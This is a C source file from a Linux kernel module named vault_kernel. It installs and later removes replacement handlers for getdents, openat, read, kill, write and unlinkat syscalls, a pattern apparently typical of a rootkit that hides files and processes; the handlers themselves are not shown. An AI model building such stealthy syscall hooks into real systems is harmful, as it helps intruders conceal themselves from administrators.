/* vault_kernel - hooking.c
 * Syscall hook installation wrapper
 * ruby570bocadito © 2026
 */
#include "core.h"
#include <linux/rcupdate.h>

int hooking_init(void) {
    int i;

    /* Set hooked function pointers */
    hooks[HOOKIDX_GETDENTS64].hooked = (unsigned long)hooked_getdents64;
    hooks[HOOKIDX_GETDENTS].hooked   = (unsigned long)hooked_getdents;
    hooks[HOOKIDX_OPENAT].hooked     = (unsigned long)hooked_openat;
    hooks[HOOKIDX_READ].hooked       = (unsigned long)hooked_read;
    hooks[HOOKIDX_KILL].hooked       = (unsigned long)hooked_kill;
    hooks[HOOKIDX_WRITE].hooked      = (unsigned long)hooked_write;
    hooks[HOOKIDX_UNLINKAT].hooked   = (unsigned long)hooked_unlinkat;

    for (i = 0; i < hooks_count; i++) {
        if (hooks[i].table_entry) {
            if (install_hook(&hooks[i])) {
                pr_warn(VAULT_KERNEL_TAG " failed to hook %s\n", hooks[i].name);
            }
        }
    }
    return 0;
}

void hooking_cleanup(void) {
    int i;
    for (i = hooks_count - 1; i >= 0; i--) {
        if (hooks[i].table_entry && hooks[i].original) {
            remove_hook(&hooks[i]);
        }
    }
    /*
     * Wait for any in-flight syscall on other CPUs to exit our hooks.
     * Without this, a concurrent CPU could be inside hooked_getdents64()
     * while we unload the module → kernel panic.
     */
    synchronize_rcu();
    pr_info(VAULT_KERNEL_TAG " all hooks removed and RCU-synchronized\n");
}
